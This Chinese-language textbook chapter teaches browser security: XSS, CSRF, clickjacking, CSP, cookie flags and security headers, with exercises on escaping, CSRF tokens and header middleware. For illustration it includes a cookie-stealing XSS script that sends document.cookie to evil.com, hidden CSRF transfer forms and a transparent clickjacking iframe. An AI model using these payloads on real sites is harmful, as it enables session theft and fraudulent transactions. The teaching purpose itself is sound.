---
title: "第十四章：浏览器安全基础"
description: "XSS、CSRF、点击劫持、CSP、安全最佳实践"
---

# 第十四章：浏览器安全基础

## 本章导读

在学这一章之前，你可能会有这些疑问：

- 我的网站好好的，为什么还要关心安全问题？
- XSS 和 CSRF 听起来很像，到底有什么区别？
- 听说有 CSP 可以防攻击，这玩意怎么用？
- 作为前端开发者，我需要懂多少安全知识？

这一章就是为了解答这些问题。我们会用最通俗的语言，搞懂 Web 开发中最常见的三种攻击方式（XSS、CSRF、点击劫持），以及对应的防御方法。这些知识不管你是做前端还是后端，都一定要懂。

---

## 14.1 为什么需要懂浏览器安全？

### 痛点分析：不懂安全的后果

想象一下这个场景：你辛辛苦苦做了一个论坛网站，用户可以发帖评论。有一天，一个用户在评论里写了这么一段话：

```html
<script>
  // 这段代码会在所有看到这条评论的人的浏览器里执行
  fetch('http://evil.com/steal?cookie=' + document.cookie)
</script>
```

结果呢？所有看到这条评论的人，他们的登录 Cookie 都被偷偷发到了攻击者的服务器上。攻击者可以用这些 Cookie 冒充他们登录，为所欲为。

这就是 **XSS 攻击**（跨站脚本攻击），是 Web 安全中最常见、最危险的攻击方式之一。

再想象另一个场景：你登录了网银，然后打开了另一个标签页看新闻。这个新闻网站里藏了一段代码，偷偷向网银发了一个转账请求。因为你的浏览器还保存着网银的登录状态，银行以为是你本人在操作，就把钱转走了。

这就是 **CSRF 攻击**（跨站请求伪造）。

> **一句话总结**：不懂安全，你的用户数据可能被偷、钱可能被转、账号可能被冒用。安全不是可选项，是必选项。

---

## 14.2 核心原理

### 14.2.1 XSS 攻击（跨站脚本攻击）

XSS 的全称是 Cross-Site Scripting（跨站脚本攻击）。之所以缩写是 XSS 而不是 CSS，是因为 CSS 已经被"层叠样式表"占用了。

XSS 的本质是：**攻击者把恶意代码注入到你的网页里，让其他用户的浏览器执行了这段代码**。

打个比方：

> XSS 就像是有人在餐厅的菜单上偷偷加了一行字："看到这句话的人，请把钱包里的钱交给门口的人"。服务员（浏览器）不会分辨这是不是餐厅写的，直接念给顾客听了。

#### XSS 的三种类型

| 类型 | 特点 | 攻击场景 | 生活类比 |
| --- | --- | --- | --- |
| 存储型 | 恶意代码存在服务器里 | 评论区、论坛帖子 | 有人在公告栏贴了张假通知 |
| 反射型 | 恶意代码在 URL 里 | 搜索结果、错误页面 | 有人骗你点了一个带毒的链接 |
| DOM 型 | 前端 JS 直接操作 DOM 引入 | 前端路由、动态渲染 | 你自己从不可信的地方拿了数据直接显示 |

#### 存储型 XSS 示例

```html
<!-- 攻击者在评论区发了这么一条"评论" -->
<!-- 如果网站没有做过滤，这段代码会被保存并显示给所有用户 -->
<script>
  // 这段代码会在每个看到这条评论的人的浏览器里执行
  // document.cookie 能拿到用户的登录 Cookie
  // 然后把 Cookie 发送到攻击者的服务器
  fetch('http://evil.com/steal?cookie=' + document.cookie)
</script>
```

#### 反射型 XSS 示例

```
<!-- 攻击者构造了一个恶意 URL -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- 用户点了这个链接，网站把 URL 里的 q 参数直接显示在页面上 -->
<!-- 浏览器就会执行这段恶意代码 -->
```

#### DOM 型 XSS 示例

```javascript
// ❌ 危险写法：直接把 URL 参数插入页面
const userInput = window.location.hash.slice(1) // 从 URL 取用户输入
document.getElementById('content').innerHTML = userInput // 直接插入 DOM

// 如果 URL 是 http://xxx.com/#<img src=x onerror=alert(1)>
// 就会执行恶意代码
```

#### XSS 防御方法

| 方法 | 说明 | 适用场景 |
| --- | --- | --- |
| 输入过滤 | 过滤掉危险字符（如 < >） | 用户提交数据时 |
| 输出转义 | 把 < 转成 &lt; 等实体 | 显示用户数据时 |
| CSP | 内容安全策略，限制脚本来源 | 全局防御 |
| HttpOnly Cookie | 禁止 JS 读取 Cookie | 保护登录凭证 |

```javascript
// ✅ 输出转义函数：把危险字符转成安全的 HTML 实体
function escapeHtml(str) {
  // 定义一个映射表，把特殊字符转成对应的 HTML 实体
  const map = {
    '&': '&amp;',   // & 转成 &amp;
    '<': '&lt;',    // < 转成 &lt;（防止被当成标签开始）
    '>': '&gt;',    // > 转成 &gt;（防止被当成标签结束）
    '"': '&quot;',  // " 转成 &quot;（防止被当成属性值）
    "'": '&#039;'   // ' 转成 &#039;（防止被当成属性值）
  }
  // 用正则匹配所有特殊字符，替换成对应的实体
  return str.replace(/[&<>"']/g, m => map[m])
}

// 使用示例
const userInput = '<script>alert("XSS")</script>'
// 转义后变成：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// 浏览器会把它当成普通文本显示，不会执行
const safeHtml = escapeHtml(userInput)
document.getElementById('content').textContent = safeHtml
```

### 14.2.2 CSRF 攻击（跨站请求伪造）

CSRF 的全称是 Cross-Site Request Forgery（跨站请求伪造）。

CSRF 的本质是：**攻击者诱导你的浏览器向目标网站发送了一个伪造的请求，而浏览器会自动带上你的登录凭证（Cookie），让目标网站以为是你本人在操作**。

打个比方：

> CSRF 就像有人骗你拿着一张已经签好名的空白支票去银行。银行看到支票上有你的签名（Cookie），就以为是你要转账，其实你根本不知道自己在干什么。

#### CSRF 攻击的 5 个步骤

1. 用户登录了目标网站（比如网银），浏览器保存了登录 Cookie
2. 用户在没有关闭网银的情况下，打开了另一个网站（攻击者的网站）
3. 攻击者的网站里藏了一段代码，向网银发了一个转账请求
4. 浏览器发请求时会自动带上网银的 Cookie
5. 网银看到请求带着合法的 Cookie，以为是用户本人在操作

#### CSRF 攻击示例

```html
<!-- 攻击者的网站里藏了这么一段代码 -->

<!-- 方式 1：用 img 标签发起 GET 请求 -->
<!-- 用户一打开这个页面，浏览器就会自动向银行发转账请求 -->
<!-- 而且会自动带上用户在银行的 Cookie -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- 方式 2：用表单发起 POST 请求 -->
<!-- 页面加载后自动提交表单 -->
<form action="http://bank.com/transfer" method="POST" id="evil-form">
  <!-- 隐藏字段：收款人是攻击者 -->
  <input type="hidden" name="to" value="attacker">
  <!-- 隐藏字段：转账金额 1000 -->
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  // 页面加载后自动提交表单
  document.getElementById('evil-form').submit()
</script>
```

#### CSRF 防御方法

| 方法 | 说明 | 原理 |
| --- | --- | --- |
| CSRF Token | 每个请求带一个随机令牌 | 攻击者不知道这个令牌是什么 |
| SameSite Cookie | 限制 Cookie 只在同站发送 | 跨站请求不会带上 Cookie |
| 验证 Referer | 检查请求来自哪个网站 | 拒绝来自非授权网站的请求 |
| 二次验证 | 敏感操作需要再次确认 | 比如转账要输入支付密码 |

```javascript
// ✅ 生成 CSRF Token（服务端代码示例）
// 引入加密模块
const crypto = require('crypto')

// 生成一个 32 字节的随机字符串作为 Token
const token = crypto.randomBytes(32).toString('hex')

// 把 Token 存到服务器的 session 里
// 然后放到表单的隐藏字段中
```

```html
<!-- ✅ 在表单中添加 CSRF Token -->
<form method="POST" action="/transfer">
  <!-- 隐藏字段，存放服务器生成的 Token -->
  <input type="hidden" name="_csrf" value="服务器生成的token值">
  <input type="text" name="to" placeholder="收款人">
  <input type="number" name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>
```

```javascript
// ✅ 前端发请求时带上 CSRF Token
// 从 meta 标签或 Cookie 中获取 Token
const token = document.querySelector('meta[name="csrf-token"]').content

// 用 fetch 发请求时把 Token 放到请求头里
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    // 把 Token 放到自定义请求头中
    'X-CSRF-Token': token
  },
  body: JSON.stringify({ to: 'friend', amount: 100 })
})
```

### 14.2.3 点击劫持

点击劫持的本质是：**攻击者用一个透明的 iframe 把你的网站嵌进来，然后在上面盖一层"诱饵"按钮。用户以为自己点的是诱饵按钮，实际上点的是 iframe 里你网站的真实按钮**。

打个比方：

> 点击劫持就像有人在银行的"删除账户"按钮上贴了一张"领取奖品"的贴纸。你以为自己点的是"领取奖品"，实际上你点的是"删除账户"。

```html
<!-- 攻击者的网站 -->
<style>
  /* 把 iframe 定位到"删除账户"按钮的位置 */
  iframe {
    position: absolute;  /* 绝对定位 */
    opacity: 0;          /* 完全透明，用户看不到 */
    z-index: -1;         /* 放在底层 */
  }
</style>

<!-- 透明的 iframe，里面是银行的删除账户页面 -->
<iframe src="http://bank.com/delete-account"></iframe>

<!-- 用户看到的"诱饵"按钮，盖在 iframe 上面 -->
<button>点击领取奖品</button>
```

#### 点击劫持防御

```http
# 方式 1：X-Frame-Options 响应头（服务端设置）
# DENY：完全不允许被 iframe 嵌入
X-Frame-Options: DENY

# SAMEORIGIN：只允许同源网站嵌入
X-Frame-Options: SAMEORIGIN

# 方式 2：CSP frame-ancestors 指令（更现代的方式）
# 不允许任何网站嵌入
Content-Security-Policy: frame-ancestors 'none'

# 只允许同源网站嵌入
Content-Security-Policy: frame-ancestors 'self'
```

### 14.2.4 CSP 内容安全策略

CSP 的全称是 Content Security Policy（内容安全策略）。

CSP 的本质是：**你给浏览器列一个"白名单"，告诉它只允许加载哪些来源的资源。这样即使攻击者注入了恶意代码，浏览器也不会执行**。

打个比方：

> CSP 就像你家的门禁白名单。只有名单上的人才能进你家，其他人一律拒之门外。就算有人骗你说"我是你朋友的朋友"，只要不在名单上，门就是不开。

#### CSP 的配置方式

```http
# 方式 1：通过 HTTP 响应头配置（推荐，服务端设置）
# 只允许加载同源的脚本和 https://cdn.example.com 的脚本
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# 方式 2：通过 HTML 的 meta 标签配置（写在 HTML 的 head 里）
```

```html
<!-- 方式 2：通过 meta 标签配置 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

#### CSP 常用指令

| 指令 | 说明 | 示例 |
| --- | --- | --- |
| default-src | 默认源（没单独指定的都用这个） | default-src 'self' |
| script-src | 允许加载脚本的来源 | script-src 'self' https://cdn.example.com |
| style-src | 允许加载样式的来源 | style-src 'self' 'unsafe-inline' |
| img-src | 允许加载图片的来源 | img-src 'self' data: |
| connect-src | 允许发起连接（fetch/XHR/WebSocket）的来源 | connect-src 'self' wss://ws.example.com |
| font-src | 允许加载字体的来源 | font-src 'self' https://fonts.gstatic.com |
| frame-src | 允许嵌入 iframe 的来源 | frame-src 'self' |

#### CSP 常用值

```http
# 'self'：只允许同源
Content-Security-Policy: script-src 'self'

# 允许特定的 CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com

# 'unsafe-inline'：允许内联脚本（不推荐，会降低安全性）
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# 'nonce-xxx'：只允许带有指定 nonce 的内联脚本（推荐）
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

```html
<!-- 使用 nonce 的方式：服务端生成随机 nonce -->
<script nonce="abc123">
  // 只有带了这个 nonce 的脚本才会被执行
  console.log('这是合法的脚本')
</script>

<script>
  // 没有 nonce 的脚本会被 CSP 拦截
  console.log('这是非法的脚本')
</script>
```

---

## 14.3 安全最佳实践

### 14.3.1 Cookie 安全

Cookie 是存储用户登录凭证的地方，如果被偷了，攻击者就能冒充用户登录。所以 Cookie 的安全至关重要。

| 属性 | 说明 | 作用 |
| --- | --- | --- |
| Secure | 只在 HTTPS 下传输 | 防止 HTTP 明文传输时被窃听 |
| HttpOnly | 禁止 JS 通过 document.cookie 读取 | 防止 XSS 偷 Cookie |
| SameSite | 限制 Cookie 只在同站发送 | 防止 CSRF 攻击 |

```http
# ✅ 安全的 Cookie 设置
# Secure：只在 HTTPS 下传输
# HttpOnly：JS 无法读取，防止 XSS 偷 Cookie
# SameSite=Strict：只在同站请求时发送，防止 CSRF
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict

# SameSite 的三个值：
# Strict：最严格，只在同站请求时发送（从别的网站点链接过来也不会带 Cookie）
# Lax：适中，GET 请求跨站会带，POST 不会（默认值）
# None：不限制，但必须同时设置 Secure（HTTPS）
```

### 14.3.2 安全响应头

除了 CSP，还有很多其他的安全响应头可以保护你的网站：

| 响应头 | 作用 | 推荐值 |
| --- | --- | --- |
| X-Content-Type-Options | 禁止浏览器猜测文件类型（MIME 嗅探） | nosniff |
| X-Frame-Options | 防止点击劫持 | DENY 或 SAMEORIGIN |
| Strict-Transport-Security | 强制使用 HTTPS（HSTS） | max-age=31536000 |
| Referrer-Policy | 控制 Referer 头部发送多少信息 | strict-origin-when-cross-origin |
| Permissions-Policy | 控制浏览器功能（摄像头、麦克风等） | camera=(), microphone=() |

```http
# ✅ 推荐的安全响应头配置（服务端设置）
# 禁止 MIME 嗅探
X-Content-Type-Options: nosniff

# 防止点击劫持
X-Frame-Options: DENY

# 强制 HTTPS，有效期 1 年
Strict-Transport-Security: max-age=31536000; includeSubDomains

# 控制 Referer 信息
Referrer-Policy: strict-origin-when-cross-origin

# 禁用摄像头和麦克风
Permissions-Policy: camera=(), microphone=()
```

### 14.3.3 其他安全建议

| 建议 | 说明 |
| --- | --- |
| 输入验证 | 服务端必须验证用户输入，不能只靠前端验证 |
| 输出编码 | 根据上下文（HTML/JS/URL）选择正确的编码方式 |
| 最小权限 | 给用户的权限越小越好，不要给多余的权利 |
| 定期更新 | 及时更新依赖库，修复已知漏洞 |
| HTTPS | 全站使用 HTTPS，防止中间人攻击 |

---

## 14.4 核心知识点总结

| 攻击类型 | 攻击原理 | 防御方法 |
| --- | --- | --- |
| XSS | 注入恶意脚本到网页 | 输入过滤、输出转义、CSP、HttpOnly Cookie |
| CSRF | 伪造用户发起请求 | CSRF Token、SameSite Cookie、验证 Referer |
| 点击劫持 | 透明 iframe 诱导点击 | X-Frame-Options、CSP frame-ancestors |
| 中间人攻击 | 窃听通信内容 | HTTPS、HSTS |

---

## 14.5 新手常见误区

### 误区 1："我用了 Vue/React，自动转义了，不用担心 XSS"

**不完全对。** Vue 和 React 的模板语法（{{ }} / {} ）确实会自动转义，防止大部分 XSS。但是！如果你用了 v-html（Vue）或 dangerouslySetInnerHTML（React），那就绕过了自动转义，还是会有 XSS 风险。另外，如果你把用户输入拼接到 URL、CSS 里，也可能产生 XSS。

```javascript
// ❌ Vue 中使用 v-html 渲染用户输入，有 XSS 风险
<template>
  <div v-html="userInput"></div>
</template>

// ✅ 正确做法：对用户输入先转义再显示
<template>
  <div>{{ userInput }}</div>
</template>
```

### 误区 2："CSRF Token 放在前端不安全"

**错！** CSRF Token 的目的不是保密，而是让攻击者无法伪造。Token 放在表单的隐藏字段里或者 meta 标签里都是可以的。攻击者能看到 Token 也没用，因为他无法让受害者的浏览器在发请求时带上这个 Token（除非他在你的网站上执行了脚本，但那已经是 XSS 了）。

### 误区 3："SameSite=Strict 能完全防住 CSRF，不需要 Token 了"

**不完全对。** SameSite=Strict 确实能防住大部分 CSRF，但它有两个问题：
1. 兼容性：老浏览器不支持
2. 用户体验：用户从别的网站点链接到你的网站时，不会带上 Cookie，相当于没登录

所以推荐的做法是：SameSite Cookie + CSRF Token 双重保护。

### 误区 4："我的网站很小，没人会攻击"

**错！** 攻击者通常是批量扫描的，不是专门针对你的。他们会扫描所有有漏洞的网站，不管大小。而且你的用户可能在大网站上也用了同样的密码，如果你的网站被攻破，他们的其他账号也可能受影响。

### 误区 5："前端做了输入验证就安全了"

**错！** 前端的验证只是为了用户体验，攻击者完全可以绕过前端直接发请求。所有的安全验证都必须在服务端做。前端验证 + 服务端验证，缺一不可。

---

## 14.6 动手练习

### 练习 1（基础）：编写一个 HTML 转义函数

编写一个函数 escapeHtml，接收一个字符串参数，把其中的 & < > " ' 五个字符转成对应的 HTML 实体，防止 XSS 攻击。

<details>
<summary>点击查看答案</summary>

```javascript
// 定义 HTML 转义函数
function escapeHtml(str) {
  // 定义字符映射表，把特殊字符映射到对应的 HTML 实体
  const map = {
    '&': '&amp;',   // & 转成 &amp;
    '<': '&lt;',    // < 转成 &lt;
    '>': '&gt;',    // > 转成 &gt;
    '"': '&quot;',  // " 转成 &quot;
    "'": '&#039;'   // ' 转成 &#039;
  }
  // 用正则表达式匹配所有需要转义的字符
  // [&<>"'] 表示匹配这 5 个字符中的任意一个
  // g 标志表示全局匹配，替换所有匹配项
  // m 是匹配到的字符，从 map 中取出对应的实体
  return str.replace(/[&<>"']/g, m => map[m])
}

// 测试用例
const malicious = '<script>alert("XSS")</script>'
console.log(escapeHtml(malicious))
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// 转义后的字符串放到页面上，浏览器只会显示文本，不会执行脚本
document.getElementById('content').textContent = escapeHtml(malicious)
```

</details>

### 练习 2（进阶）：实现一个简单的 CSRF Token 验证

实现以下功能：
1. 服务端生成一个随机 Token，存到 session 中，并返回给前端
2. 前端在发请求时把 Token 放到请求头里
3. 服务端验证请求头里的 Token 是否和 session 里的一致

<details>
<summary>点击查看答案</summary>

```javascript
// 服务端代码（Node.js + Express 示例）
const express = require('express')
const crypto = require('crypto')
const app = express()

// 生成 CSRF Token 的接口
app.get('/api/csrf-token', (req, res) => {
  // 生成 32 字节的随机字符串
  const token = crypto.randomBytes(32).toString('hex')
  // 把 Token 存到 session 中
  req.session.csrfToken = token
  // 返回给前端
  res.json({ token })
})

// 需要保护的转账接口
app.post('/api/transfer', (req, res) => {
  // 从请求头中获取 Token
  const requestToken = req.headers['x-csrf-token']
  // 从 session 中获取正确的 Token
  const sessionToken = req.session.csrfToken

  // 验证 Token 是否存在且一致
  if (!requestToken || requestToken !== sessionToken) {
    // Token 不匹配，拒绝请求
    return res.status(403).json({ error: 'CSRF 验证失败' })
  }

  // Token 验证通过，处理业务逻辑
  res.json({ success: true, message: '转账成功' })
})
```

```javascript
// 前端代码
// 页面加载时获取 CSRF Token
let csrfToken = ''

async function initCsrfToken() {
  // 请求服务端获取 Token
  const res = await fetch('/api/csrf-token')
  const data = await res.json()
  // 保存 Token
  csrfToken = data.token
}

// 发请求时带上 Token
async function transfer(to, amount) {
  const res = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      // 把 Token 放到自定义请求头中
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ to, amount })
  })
  return res.json()
}

// 初始化
initCsrfToken()
```

</details>

### 练习 3（挑战）：实现一个完整的安全响应头中间件

编写一个 Express 中间件，自动为所有响应添加安全响应头，包括：
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- Strict-Transport-Security（HSTS）
- Content-Security-Policy
- Referrer-Policy

<details>
<summary>点击查看答案</summary>

```javascript
// Express 安全响应头中间件
function securityHeaders(options = {}) {
  // 返回中间件函数
  return (req, res, next) => {
    // 禁止 MIME 嗅探，防止浏览器把非脚本文件当成脚本执行
    res.setHeader('X-Content-Type-Options', 'nosniff')

    // 防止点击劫持，不允许任何网站嵌入 iframe
    res.setHeader('X-Frame-Options', 'DENY')

    // HSTS：强制浏览器在 1 年内只用 HTTPS 访问这个网站
    // includeSubDomains 表示子域名也要遵守
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')

    // CSP：内容安全策略
    // default-src 'self'：默认只允许加载同源资源
    // script-src：允许加载同源和指定 CDN 的脚本
    // style-src：允许同源和内联样式
    // img-src：允许同源、data: 和 https 图片
    res.setHeader('Content-Security-Policy', 
      "default-src 'self'; " +
      "script-src 'self' https://cdn.example.com; " +
      "style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data: https:; " +
      "font-src 'self' https://fonts.gstatic.com"
    )

    // 控制 Referer 信息：跨站时只发送源站，不发送路径
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')

    // 禁用摄像头和麦克风 API
    res.setHeader('Permissions-Policy', 'camera=(), microphone=()')

    // 继续处理下一个中间件
    next()
  }
}

// 使用示例
const express = require('express')
const app = express()

// 在所有路由之前使用安全中间件
app.use(securityHeaders())

// 之后的所有路由都会自动带上安全响应头
app.get('/', (req, res) => {
  res.send('Hello World')
})
```

</details>

---

## 下一章预告

下一章我们会学习 **网络调试工具**——也就是怎么用浏览器的开发者工具（DevTools）来查看网络请求、分析性能问题、用 Charles/Fiddler 等抓包工具调试接口。学完这章，你就能自己排查"为什么接口报错了""为什么页面加载这么慢"这类问题了。
